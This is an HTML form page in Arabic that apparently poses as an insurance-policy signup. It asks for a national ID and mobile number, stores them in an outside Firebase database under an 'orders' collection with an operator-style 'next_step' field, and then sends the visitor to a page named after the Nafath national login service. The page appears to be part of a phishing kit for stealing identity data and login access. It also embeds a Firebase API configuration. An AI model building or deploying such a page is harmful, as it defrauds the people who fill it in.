<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب تأمين جديد</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 { color: #333; margin-bottom: 30px; font-weight: bold; }
        .input-group { text-align: right; margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #666; font-size: 14px; }
        input {
            width: 100%;
            padding: 15px;
            border: 1px solid #eee;
            border-radius: 12px;
            background: #fdfdfd;
            font-size: 16px;
            text-align: center;
            box-sizing: border-box;
            transition: 0.3s;
        }
        input:focus { border-color: #007bff; outline: none; background: #fff; }
        button {
            width: 100%;
            padding: 15px;
            background: #4a8df8;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        button:hover { background: #357ae8; transform: translateY(-2px); }
        .error { color: #dc3545; font-size: 13px; margin-top: 10px; display: none; }
    </style>
</head>
<body>

<div class="card">
    <h2>إصدار وثيقة تأمين</h2>
    
    <div class="input-group">
        <label>رقم الهوية / الإقامة</label>
        <input type="tel" id="id_num" placeholder="1XXXXXXXXX" maxlength="10">
    </div>

    <div class="input-group">
        <label>رقم الجوال</label>
        <input type="tel" id="phone_num" placeholder="05XXXXXXXX" maxlength="10">
    </div>

    <div id="err" class="error"></div>
    
    <button onclick="checkAndSend()">أمن الحين</button>
</div>

<script>
    // إعدادات Firebase الخاصة بك
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function toEng(s) { return s.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632); }

    async function checkAndSend() {
        const e = document.getElementById('err');
        e.style.display = "none";

        let id = toEng(document.getElementById('id_num').value.trim());
        let ph = toEng(document.getElementById('phone_num').value.trim());

        // فلترة ذكية
        if (id.length !== 10 || (id[0] !== '1' && id[0] !== '2')) {
            e.innerText = "❌ رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام";
            e.style.display = "block";
            return;
        }

        if (ph.length !== 10 || !ph.startsWith('05')) {
            e.innerText = "❌ رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام";
            e.style.display = "block";
            return;
        }

        // إرسال البيانات
        try {
            const res = await db.collection("orders").add({
                id_number: id,
                phone: ph,
                next_step: "WAITING",
                status: "طلب جديد",
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });
            localStorage.setItem('user_id', res.id);
            window.location.href = "nafath.html";
        } catch (err) {
            alert("خطأ في الشبكة، حاول ثانية");
        }
    }
</script>

</body>
</html>
